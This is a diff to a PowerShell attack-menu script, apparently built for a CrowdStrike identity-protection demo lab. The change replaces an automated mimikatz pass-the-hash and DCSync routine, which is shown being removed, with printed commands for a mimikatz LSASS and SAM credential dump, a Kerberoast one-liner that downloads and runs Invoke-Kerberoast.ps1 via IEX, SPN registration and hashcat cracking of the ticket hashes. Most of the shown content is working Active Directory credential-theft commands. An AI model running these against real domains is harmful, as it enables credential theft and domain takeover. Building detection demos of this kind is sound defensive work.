@@ -1,7 +1,7 @@
 # ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  CrowdStrike NGSIEM + Identity Protection Demo
-#  Version: 5.0 (2026-04-02)
+#  Version: 5.1 (2026-04-03)
 #
 #  Attack narrative:
 #    1. Phishing campaign (narrative)
@@ -9,7 +9,7 @@
 #    3. Recon + credential dump on UNMANAGED host (active)
 #    4. Crack demo hash + kerbrute spray (active)
 #    5. Lateral movement: RDP to DT with demo account (active)
-#    6. Dump on DT + DCSync on DC (active)
+#    6. Dump DT (dead end) + Kerberoast (active — triggers IDP)
 #    7. Lateral movement to Ubuntu - cloud detections (active)
 # ============================================================
 
@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.0"
+$scriptVersion = "5.1"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -122,7 +122,7 @@ function Show-Menu {
     Write-Host
     Write-Host "================ Identity Attack Demo - Unmanaged Host  [v$scriptVersion] ================" -ForegroundColor Cyan
     Write-Host
-    Write-Host "  Story: phishing > Fortinet exploit > dump unmanaged > crack > RDP to DT > DCSync > cloud" -ForegroundColor DarkGray
+    Write-Host "  Story: phishing > Fortinet exploit > dump unmanaged > crack > RDP to DT > Kerberoast > cloud" -ForegroundColor DarkGray
     Write-Host
     Write-Host "  --- Narrative (logs from log generator) ---" -ForegroundColor Yellow
     Write-Host "  1: Phishing Campaign                       [Mimecast spearphishing]"
@@ -134,7 +134,7 @@ function Show-Menu {
     Write-Host
     Write-Host "  --- Lateral Movement ---" -ForegroundColor Yellow
     Write-Host "  5: RDP to DT with demo account             [Lateral mvt: shared local admin -> DT]"
-    Write-Host "  6: Dump on DT + DCSync on DC               [mimikatz on DT + PtH -> DCSync]"
+    Write-Host "  6: Dump DT + Kerberoast                   [mimikatz on DT + Kerberoast -> IDP detection]"
     Write-Host "  7: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 scripts]"
     Write-Host
     Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
@@ -432,57 +432,82 @@ public class CryptoMD4 {
         }
 
         # ================================================================
-        # STEP 6: DUMP ON DT + DCSYNC ON DC (Active)
+        # STEP 6: DUMP DT + KERBEROAST (Active)
         # ================================================================
         '6' {
-            Show-StepBanner -Step "6" -Title "DUMP ON DT + DCSYNC ON DC" -Lines @(
-                "Now on DT (via RDP), the attacker dumps credentials."
-                "DT has CrowdStrike Falcon - this triggers detections."
+            Show-StepBanner -Step "6" -Title "DUMP DT + KERBEROAST" -Lines @(
+                "Now on DT (via RDP), the attacker dumps local credentials."
+                "DT has CrowdStrike Falcon in DETECT mode - triggers detections."
                 ""
-                "Then uses any Domain Admin hash found to DCSync the DC,"
-                "extracting ALL domain password hashes."
-            ) -Detection "CrowdStrike: LSASS access, credential dump, PassTheHash, DCSync"
+                "Result: only local accounts (demo, bob, ansible-user) - NO domain admin."
+                "Dead end for the attacker... so they pivot to KERBEROASTING."
+                ""
+                "Kerberoasting requests TGS tickets for service accounts (SPNs),"
+                "then cracks them offline. CrowdStrike IDP detects this on the DC."
+            ) -Detection "CrowdStrike: LSASS access, credential dump, Kerberoasting (IDP)"
 
-            Write-Host "  NOTE: Run mimikatz on DT (in the RDP session):" -ForegroundColor Yellow
+            # --- Sub-step 6a: Mimikatz dump on DT ---
+            Write-Host "  ===========================================" -ForegroundColor DarkGray
+            Write-Host "  Step 6a: Mimikatz dump on DT" -ForegroundColor Yellow
+            Write-Host "  ===========================================" -ForegroundColor DarkGray
             Write-Host
-            Write-Host "  On DT, open an admin cmd and run:" -ForegroundColor Cyan
+            Write-Host "  In the RDP session on DT, open an admin cmd and run:" -ForegroundColor Cyan
+            Write-Host
             Write-Host '    C:\IDP_Files\Mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "log C:\IDP_Files\dt_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"' -ForegroundColor Green
             Write-Host
-            Write-Host "  Look for Domain Admin hashes (e.g., clark.monroe)." -ForegroundColor White
+            Write-Host "  Expected result: demo, bob, ansible-user — NO domain admin cached." -ForegroundColor White
+            Write-Host "  -> This is a dead end. The attacker needs another approach." -ForegroundColor Red
             Write-Host
-            Write-Host "  -----------------------------------------------" -ForegroundColor DarkGray
+            pause
+
+            # --- Sub-step 6b: Kerberoast ---
+            Write-Host
+            Write-Host "  ===========================================" -ForegroundColor DarkGray
+            Write-Host "  Step 6b: Kerberoasting from DT" -ForegroundColor Yellow
+            Write-Host "  ===========================================" -ForegroundColor DarkGray
+            Write-Host
+            Write-Host "  The attacker pivots to Kerberoasting — requests TGS tickets" -ForegroundColor White
+            Write-Host "  for all service accounts with SPNs in Active Directory." -ForegroundColor White
+            Write-Host "  Any domain user can do this (even demo)." -ForegroundColor White
+            Write-Host
+            Write-Host "  This triggers CrowdStrike IDP detection on the DC:" -ForegroundColor Yellow
+            Write-Host "    -> CredentialCompromise / SuspiciousKerberosTicketRequest" -ForegroundColor Yellow
             Write-Host
 
-            # Offer DCSync if we have a DA hash
-            $clarkHash = Get-ClarkHash
-            if ($clarkHash) {
-                Write-Host "  [+] clark.monroe hash available: $clarkHash" -ForegroundColor Green
-                $doDCSync = Read-Host "  Launch DCSync with clark.monroe? (y/N)"
-                if ($doDCSync -eq 'y') {
-                    $dcSyncBat = @(
-                        "@echo off"
-                        "echo [*] DCSync against $env:ENV_DC_IP ($env:ENV_DOMAIN)..."
-                        "echo."
-                        "`"$mimiExe`" `"privilege::debug`" `"log $idpDir\dcsync_output.log`" `"lsadump::dcsync /domain:$env:ENV_DOMAIN /all /csv`" `"exit`""
-                        "echo."
-                        "echo [+] DCSync complete. Output: $idpDir\dcsync_output.log"
-                        "pause"
-                    )
-                    $dcSyncBat -join "`r`n" | Out-File -FilePath "$idpDir\Post_PtH_DCSync.bat" -Encoding ASCII
-
-                    Write-Host "  [*] Launching PtH clark.monroe -> DCSync..." -ForegroundColor White
-                    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\Post_PtH_DCSync.bat`""
-                    Write-Host "  [+] DCSync launched in new window." -ForegroundColor Green
-                }
-            } else {
-                Write-Host "  [*] No DA hash yet. Run mimikatz on DT first (see above)." -ForegroundColor Yellow
-                Write-Host "  [*] Then enter the clark.monroe hash:" -ForegroundColor Yellow
-                $manualClark = Read-Host "  clark.monroe NTLM (32 hex, or Enter to skip)"
-                if ($manualClark -and $manualClark.Length -eq 32) {
-                    $manualClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
-                    Write-Host "  [+] Saved. Re-run Step 6 to launch DCSync." -ForegroundColor Green
-                }
+            $doKerb = Read-Host "  Run Kerberoast on DT via RDP session? (y/N)"
+            if ($doKerb -eq 'y') {
+                Write-Host
+                Write-Host "  In the RDP session on DT, open a PowerShell (admin) and run:" -ForegroundColor Cyan
+                Write-Host
+                Write-Host '    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); Invoke-Kerberoast -OutputFormat Hashcat | fl' -ForegroundColor Green
+                Write-Host
+                Write-Host "  To save the hash to a file:" -ForegroundColor Cyan
+                Write-Host '    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File C:\IDP_Files\kerberoast_hashes.txt' -ForegroundColor Green
+                Write-Host
+                Write-Host "  NOTE: Make sure svc_runbook (or svc_backup) has an SPN registered:" -ForegroundColor DarkGray
+                Write-Host "    setspn -A MSSQLSvc/warp-duck-DT.$($env:ENV_DOMAIN):1433 svc_runbook" -ForegroundColor DarkGray
+                Write-Host
             }
+
+            # --- Sub-step 6c: Crack TGS hash ---
+            Write-Host "  ===========================================" -ForegroundColor DarkGray
+            Write-Host "  Step 6c: Crack the Kerberoast hash" -ForegroundColor Yellow
+            Write-Host "  ===========================================" -ForegroundColor DarkGray
+            Write-Host
+            Write-Host "  If you got a TGS hash, crack it with hashcat:" -ForegroundColor White
+            Write-Host "    hashcat -m 13100 kerberoast_hashes.txt wordlist.txt" -ForegroundColor Green
+            Write-Host
+            Write-Host "  Or paste the hash below to try cracking with the local wordlist." -ForegroundColor White
+            Write-Host
+            $tgsHash = Read-Host "  Paste TGS hash (or Enter to skip)"
+            if ($tgsHash) {
+                Write-Host
+                Write-Host "  [*] TGS hash saved. Use hashcat offline to crack:" -ForegroundColor Yellow
+                $tgsHash | Out-File -FilePath "$idpDir\kerberoast_tgs.txt" -Encoding ASCII
+                Write-Host "    Saved to: $idpDir\kerberoast_tgs.txt" -ForegroundColor Green
+                Write-Host "    hashcat -m 13100 $idpDir\kerberoast_tgs.txt $idpDir\wordlist.txt" -ForegroundColor Green
+            }
+            Write-Host
         }
 
         # ================================================================
